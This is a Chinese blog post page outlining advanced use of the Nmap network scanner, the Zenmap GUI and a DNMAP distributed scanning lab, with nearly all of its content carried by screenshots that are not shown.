                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="NMAP高级使用技巧"><a href="#NMAP高级使用技巧" class="headerlink" title="NMAP高级使用技巧"></a>NMAP高级使用技巧</h2><h3 id="1-NMAP概述"><a href="#1-NMAP概述" class="headerlink" title="1. NMAP概述"></a>1. NMAP概述</h3><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803103409648.png" alt="image-20210803103409648"></p>
<h3 id="1-2NMAP端口状态解析"><a href="#1-2NMAP端口状态解析" class="headerlink" title="1.2NMAP端口状态解析"></a>1.2NMAP端口状态解析</h3><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803103523674.png" alt="image-20210803103523674"></p>
<h3 id="1-3NMAP语法及事例"><a href="#1-3NMAP语法及事例" class="headerlink" title="1.3NMAP语法及事例"></a>1.3NMAP语法及事例</h3><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803103641884.png" alt="image-20210803103641884"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803103751441.png" alt="image-20210803103751441"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803103806715.png" alt="image-20210803103806715"></p>
<p>说明：-V表示展示详情</p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803103929903.png" alt="image-20210803103929903"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104028322.png" alt="image-20210803104028322"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104219042.png" alt="image-20210803104219042"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104500173.png" alt="image-20210803104500173"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104536197.png" alt="image-20210803104536197"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104602876.png" alt="image-20210803104602876"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104621171.png" alt="image-20210803104621171"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104731313.png" alt="image-20210803104731313"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104905929.png" alt="image-20210803104905929"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803104951631.png" alt="image-20210803104951631"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803105008022.png" alt="image-20210803105008022"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803105033633.png" alt="image-20210803105033633"></p>
<h3 id="1-4图形界面zenmap的使用"><a href="#1-4图形界面zenmap的使用" class="headerlink" title="1.4图形界面zenmap的使用"></a>1.4图形界面zenmap的使用</h3><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803105509548.png"></p>
<p>若没有，需要自己安装</p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803105636842.png" alt="image-20210803105636842"></p>
<h4 id="1-4-2脚本-模式介绍"><a href="#1-4-2脚本-模式介绍" class="headerlink" title="1.4.2脚本/模式介绍"></a>1.4.2脚本/模式介绍</h4><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803105753567.png" alt="image-20210803105753567"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803105857751.png" alt="image-20210803105857751"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803110114003.png" alt="image-20210803110114003"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803110129079.png" alt="image-20210803110129079"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803110144295.png" alt="image-20210803110144295"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803110212394.png" alt="image-20210803110212394"></p>
<h3 id="2-DNMAP分布式集群执行大量扫描任务"><a href="#2-DNMAP分布式集群执行大量扫描任务" class="headerlink" title="2.DNMAP分布式集群执行大量扫描任务"></a>2.DNMAP分布式集群执行大量扫描任务</h3><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803160319878.png" alt="image-20210803160319878"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803160328893.png" alt="image-20210803160328893"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803160355981.png" alt="image-20210803160355981"></p>
<h4 id="实验步骤1-生成证书"><a href="#实验步骤1-生成证书" class="headerlink" title="实验步骤1.生成证书"></a>实验步骤1.生成证书</h4><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803160518801.png" alt="image-20210803160518801"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803161037172.png" alt="image-20210803161037172"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803160554266.png" alt="image-20210803160554266"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803160815012.png" alt="image-20210803160815012"></p>
<h4 id="步骤2：创建NMAP命令文件"><a href="#步骤2：创建NMAP命令文件" class="headerlink" title="步骤2：创建NMAP命令文件"></a>步骤2：创建NMAP命令文件</h4><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803161703146.png" alt="image-20210803161703146"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803160948086.png" alt="image-20210803160948086"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803161005556.png" alt="image-20210803161005556"></p>
<h4 id="步骤2：启动DNMAP集群"><a href="#步骤2：启动DNMAP集群" class="headerlink" title="步骤2：启动DNMAP集群"></a>步骤2：启动DNMAP集群</h4><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803161206333.png" alt="image-20210803161206333"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803161751696.png" alt="image-20210803161751696"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803161602780.png" alt="image-20210803161602780"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803161931714.png" alt="image-20210803161931714"></p>
<p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803162033761.png" alt="image-20210803162033761"></p>
<h4 id="步骤3：查看结果"><a href="#步骤3：查看结果" class="headerlink" title="步骤3：查看结果"></a>步骤3：查看结果</h4><p><img src="/2021/08/04/NMAP%E9%AB%98%E7%BA%A7%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/image-20210803162228227.png" alt="image-20210803162228227"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">北极星上的稻草人</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">35</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">6</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">19</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">北极星上的稻草人</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
</div>








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  


<!-- 页面动态背景 -->

<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>


</body>
</html>
<!-- 页面点击小红心 -->
<script type="text/javascript" src="/js/clicklove.js"></script>